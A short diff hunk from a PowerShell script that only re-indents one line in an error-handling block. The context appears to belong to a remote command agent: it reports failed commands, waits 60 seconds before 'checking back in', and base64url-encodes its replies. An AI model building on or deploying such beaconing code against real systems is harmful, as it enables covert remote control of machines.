@@ -144,7 +144,7 @@ function main {
 			catch
 			{
 				#[->] uncomment warnings below for debugging
-        $er = $_.Exception.Message
+        			$er = $_.Exception.Message
 				if ( $er -match 'CERT CHECK FAILED!' ) { exit } else { $stmp = time-stamp; $ermsg = $stmp + ' COMMAND FAILED!!! Waiting for 60 seconds before checking back in.' }
 				$senderror = $ermsg
 				$encstdout = b64url-enc $senderror
